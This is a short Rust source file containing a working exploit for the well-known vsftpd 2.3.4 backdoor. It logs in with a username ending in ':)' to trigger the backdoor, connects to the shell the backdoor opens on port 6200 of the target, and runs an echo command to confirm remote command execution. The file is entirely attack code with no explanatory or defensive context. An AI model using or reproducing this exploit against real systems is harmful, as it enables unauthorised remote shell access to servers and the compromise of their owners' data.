use std::{error::Error, io::{Read, Write}, net::TcpStream, thread, time::Duration};

pub fn vsftpd_234_exploit(ip:&str, port:u32) -> Result<String, Box<dyn Error>> {

    let mut conn = TcpStream::connect(format!("{}:{}", ip,port).as_str())?;

    conn.write_all("USER letmein:)\n".as_bytes());
    conn.write_all("PASS please\n".as_bytes());

    thread::sleep(Duration::from_secs(3));

    let mut connection = TcpStream::connect(format!("{ip}:6200").as_str())?;

    connection.write_all("echo 'dudu'".as_bytes());

    let mut buffer_recved_of_comand = [0; 1024];

    thread::sleep(Duration::from_secs(3));
    let qunatity_of_bytes = connection.read(&mut buffer_recved_of_comand)?;

    let result_comand = String::from_utf8_lossy(&buffer_recved_of_comand[..qunatity_of_bytes]).to_string();

    if result_comand.contains("dudu") {

        return Ok(result_comand);
    } else {
        println!("[ 404 ] - get shell is undefined [ {result_comand} ]");
        Err("sla".into())
}       

}